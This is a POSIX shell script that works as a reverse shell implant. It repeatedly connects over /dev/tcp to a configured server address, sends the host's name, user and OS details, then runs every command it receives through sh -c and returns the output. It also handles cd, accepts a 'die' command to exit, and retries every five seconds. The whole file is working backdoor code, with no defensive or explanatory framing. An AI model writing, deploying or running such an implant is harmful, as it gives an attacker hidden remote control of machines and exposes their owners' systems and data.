#!/bin/sh

SERVER_IP="127.0.0.1"
SERVER_PORT=22

get_system_info() {
    HOSTNAME="$(hostname)"
    USERNAME="$(whoami)"
    UNAME_OUT="$(uname -a)"

    OS_NAME="$(echo "$UNAME_OUT" | awk '{print $2}')"
    VERSION="$(echo "$UNAME_OUT" | awk '{print $3}' | cut -d- -f1)"
    ARCH="$(echo "$UNAME_OUT" | awk '{print $(NF-1)}')"

    echo "$HOSTNAME,$USERNAME,$OS_NAME,$VERSION,$ARCH"
}

connect() {
    while true; do
        exec 3<>/dev/tcp/"$SERVER_IP"/"$SERVER_PORT" 2>/dev/null
        if [ $? -eq 0 ]; then
            SYSTEM_INFO="$(get_system_info)"
            echo "$SYSTEM_INFO" >&3
            shell_loop 3
            exec 3<&- 3>&-
        fi
        sleep 5
    done
}

shell_loop() {
    SOCKET=$1
    while true; do
        if ! read -r CMD <&$SOCKET; then
            break
        fi

        [ -z "$CMD" ] && break

        if echo "$CMD" | grep -q "^cd "; then
            DIR="$(echo "$CMD" | cut -d' ' -f2-)"
            if cd "$DIR" 2>/dev/null; then
                :
            else
                echo "Error: No such directory: $DIR" >&$SOCKET
            fi
            echo "__END__" >&$SOCKET
            continue
        fi

        if [ "$CMD" = "die" ]; then
            exit 0
        fi

        OUTPUT="$(sh -c "$CMD" 2>&1)"
        if [ -n "$OUTPUT" ]; then
            echo "$OUTPUT" >&$SOCKET
        fi
        echo "__END__" >&$SOCKET
    done
}

connect
